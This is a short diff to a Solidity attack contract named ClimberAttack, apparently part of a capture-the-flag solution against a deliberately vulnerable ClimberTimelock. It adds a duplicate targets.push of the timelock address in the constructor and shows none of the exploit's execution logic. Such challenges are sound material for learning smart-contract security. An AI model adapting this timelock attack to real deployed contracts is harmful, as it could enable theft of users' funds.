@@ -21,7 +21,7 @@ contract ClimberAttack {
     ) {
         lock = ClimberTimelock(_timeLock);
         targets.push(_timeLock);
-        // targets.push(_timeLock);
+        targets.push(_timeLock);
         targets.push(address(this));
         values = _values;
         salt = _salt;
